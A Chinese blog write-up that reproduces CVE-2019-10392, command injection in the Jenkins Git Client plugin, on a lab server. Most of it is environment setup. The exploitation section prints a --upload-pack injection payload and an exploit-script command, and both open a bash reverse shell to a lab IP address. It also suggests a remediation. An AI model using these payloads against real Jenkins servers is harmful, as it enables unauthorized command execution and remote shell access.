---
title: "Jenkins Git Client插件远程命令执行漏洞"
date: 2019-11-06T14:32:15+08:00
draft: false
tags: ['远程代码执行漏洞']
categories: ['漏洞复现']
---
最近在整理Jenkins相关漏洞,所以来复现下!!

<!--more-->

# 0x01: 漏洞简介：
Git客户端插件接受用户指定的值作为调用的参数，git ls-remote以验证指定URL处是否存在Git存储库。这是以允许具有作业/配置权限的攻击者在Jenkins主服务器上执行任意系统命令作为Jenkins进程正在运行的OS用户的方式实现的。

Git客户端插件现在拒绝看似不是有效URL的存储库URL。此外，对于支持它的Git版本，使用--分隔符将存储库URL参数与选项参数分开，以防止将解释作为选项。

截至本通报发布时，没有针对3.x的预发布版本的用户的更新，例如3.0.0-rc。建议Git客户端插件3.0.0-rc的用户降级到2.8.5（并将[Git插件](https://plugins.jenkins.io/git)从4.0.0-rc 降级到最新的3.x版本以解决依赖性问题）。

# 0x02 影响范围
Git client Plugin <= 2.8.4

# 0x03: 环境搭建：
下载安装可参考我之前得文章：

前提条件：需要安装有java环境！

## Linux下安装Java：
1. 下载linux对应的jdk包：

![图片](https://ae01.alicdn.com/kf/U79cf792710664d69b2bb7ddc6e16fa28C.jpg)

2. 解压下载好的jdk包：
```
tar -zxf jdk-8u201-linux-x64.tar.gz
```
3. 修改环境变量文件：/etc/profile   在末尾添加如下内容（根据自己jdk文件位置填写）

![图片](https://ae01.alicdn.com/kf/U6ce9662b9ce04c8abf4807cab2cbdb4af.jpg)

4. 使用source让我们添加的环境变量生效：
```
source  /etc/profile
```
5. 执行java -version验证我们的环境变量是否生效：

![图片](https://ae01.alicdn.com/kf/U46b55b10e3464daca88eff48643810b7B.jpg)

## 安装Jenkins
### 第一种方法
```
sudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo
sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key

yum install jenkins
```
### 第二种方法
直接下载 rpm 安装，jenkins各个版本地址 [https://pkg.jenkins.io/](https://pkg.jenkins.io/)

```
wget https://pkg.jenkins.io/redhat/jenkins-2.156-1.1.noarch.rpm

rpm -ivh jenkins-2.156-1.1.noarch.rpm
```
### 这里我就用第一种方法了：
1. 下载yum源文件
```
wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo
```
2. 导入公钥：
```
rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key
```
3. yum安装jenkins：
```
yum -y install jenkins
```
4. 启动jenkins：

![图片](https://ae01.alicdn.com/kf/U893575cbbb1d4e5892528b90634a0488X.jpg)

直接启动会报错，我们还需要对配置文件进行下修改：

5. 修改jenkins启动文件/etc/init.d/jenkins   

![图片](https://ae01.alicdn.com/kf/Uf341624905e04709ad4435ac2db524dbq.jpg)

对candidates对应的值进行修改，改为自己机器的java所在路径：

![图片](https://ae01.alicdn.com/kf/Ue0229fc3772e4ba88956f739ffddc226L.jpg)

6. 还需要修改下： /etc/sysconfig/jenkins 文件，需要设置 JENKINS_USER的值为root，要不然启动会报错 ：  permission denied

![图片](https://ae01.alicdn.com/kf/Ub6079d2f1946415fb389489c96fa4c16x.jpg)

将图中JENKINS_USER对应的值改为root

![图片](https://ae01.alicdn.com/kf/Ue743f01ae18943d88fa832f5049a528aS.jpg)

7. 修改完配置文件后，我们需要执行以下命令来刷新配置,让systemctl能识别:
```
systemctl daemon-reload
```
8. 这下可以启动Jenkins了：
```
service jenkins start
```
9. 浏览器访问验证：
```
http://172.26.1.171:8080
```
10. 第一次访问会让我们进行相关配置：

![图片](https://ae01.alicdn.com/kf/Ubb3663a98cea48baa652f4d97be88a63G.jpg)

11. 我们到对应的目录下找到该文件，将其内容复制输入即可：

![图片](https://ae01.alicdn.com/kf/U1531a0a4e9b44b309ab324c03dda5fba9.jpg)

12. 选择安装方式：

![图片](https://ae01.alicdn.com/kf/U89f82b7395dc482c81b6ae6b09146b9dP.jpg)

这里我们因为需要安装指定版本的git client插件，所以我们  选择插件来安装

12. 找到git，取消复选框的勾选，因为默认他会安装最新版，那样我们就无法复现该漏洞了！

![图片](https://ae01.alicdn.com/kf/U8b5c7325c89b42aeb8251fbf00fab31fN.jpg)

13. 选择完需要安装的组件后，点击安装即可，安装完插件后：

![图片](https://ae01.alicdn.com/kf/Uccc05b7102e645ceb3449a70186856b2t.jpg)

14. 我们可以新创建一个用户也可以使用默认的amin用户，选择完后进入到实例配置：

![图片](https://ae01.alicdn.com/kf/U3c316778aae84572b171d43378cd143eE.jpg)

15. 配置完成后即可正常使用jenkins：

![图片](https://ae01.alicdn.com/kf/U0bd5782538c9490abb309ef355174bbes.jpg)

16. 访问搭建好的jenkins：

![图片](https://ae01.alicdn.com/kf/Uefced903974142cea0a2638d3bb8d764h.jpg)

17. 选择[Manage Jenkins](http://172.26.1.171:8080/manage)选项 中的Manage Plugins来安装存在漏洞的git client版本

![图片](https://ae01.alicdn.com/kf/U6b1a82b8277a4d60b77d862ee2668d95G.jpg)

18. 下载在漏洞影响范围内的git client插件和git插件：

git client插件地址：[https://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi](https://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi)

git插件地址：[http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi](http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi)

19. 找到下图位置，点击选择文件 选择刚刚下载的hpi文件   然后点击上传即可：

![图片](https://ae01.alicdn.com/kf/U868d137f1e0448e89e1ca8b00741b50a6.jpg)

20. 安装完成：

![图片](https://ae01.alicdn.com/kf/U3cf705628d4f48949a141b374d0710e68.jpg)

21. 重新启动jenkis使插件生效：
```
service jenkins restar
```
22. 新建一个用户用于测试漏洞：

![图片](https://ae01.alicdn.com/kf/Ufa3deeb1bf1d46679c24c093d88932a9d.jpg)

23. 为test用户配置访问权限：

![图片](https://ae01.alicdn.com/kf/Uccba57bb3a5d4e278f3de0c62cf903cff.jpg)

24. 还需要靶机本身安装git
```
yum -y install git
```
不安装在复现的时候会报错：
```
Failed to connect to repository : Error performing command: git ls-remote -h
```
此报错解决参考：
[https://www.cnblogs.com/cyleon/p/11159184.html](https://www.cnblogs.com/cyleon/p/11159184.html)

# 0x04: 漏洞复现：
提供账号：

用户名：test

密码：123456

1. 使用拥有创建任务权限得账号登陆：

![图片](https://ae01.alicdn.com/kf/Uf3d138fe3b9140afaa1f0c3ae1d0c37fG.jpg)

2. 创建一个新的任务：

![图片](https://ae01.alicdn.com/kf/U25338b71068545e6976900c8137c17fdS.jpg)

名称随便起一个，然后选择流水线，再点击确定即可创建：

![图片](https://ae01.alicdn.com/kf/Uc77d632f1e9c4ef084c0094cbd3360c3d.jpg)

选择流水线选项----->Pipeline script from SCM----->Git

然后在Repository URL对应的输入框输入 POC：

![图片](https://ae01.alicdn.com/kf/Ue8e1457603864fc0ab947d6a37486879K.jpg)

3. 输入公开的poc即可：

![图片](https://ae01.alicdn.com/kf/Ufba33629db11478ea3ea624c62c2e20aZ.jpg)

可以看到命令成功执行

4. 直接反弹shell：
```
--upload-pack="`bash -i >& /dev/tcp/172.26.1.156/6666 0>&1`"
```
![图片](https://ae01.alicdn.com/kf/U048e08d81665493480e4ad652e1579395.jpg)

5. 关于该漏洞的利用脚本：

![图片](https://ae01.alicdn.com/kf/Ud138282a94c444a38775ed43c655fed9G.jpg)

6. 利用该脚本反弹shell：
```
py -3 Jenkins_Git_RCE_CVE-2019-10392.py -u http://172.26.1.171:8080  -U test -P 123456 -i ce -c "bash -i >%26 /dev/tcp/172.26.1.156/6666 0>%261"
```
利用：
![图片](https://ae01.alicdn.com/kf/Uf4d97d3c44ea4bdc9529792f11e5fc93y.jpg)

这里注意下使用bash反弹shell的时候需要将命令中的&符号进行url编码才可正常执行。

感谢[ftk-sostupid](https://github.com/ftk-sostupid)大佬一直耐心解答我对于脚本使用的问题！！！！！！

# 0x05: 漏洞修复：
升级Git client插件至2.8.4以上版本

# 0x06: 参考链接：
[https://www.cnblogs.com/paperpen/p/11626231.html](https://www.cnblogs.com/paperpen/p/11626231.html)

[https://mp.weixin.qq.com/s/Axx7KYm9irAQv7ZIO8autg](https://mp.weixin.qq.com/s/Axx7KYm9irAQv7ZIO8autg)

[https://github.com/ftk-sostupid/CVE-2019-10392_EXP](https://github.com/ftk-sostupid/CVE-2019-10392_EXP)

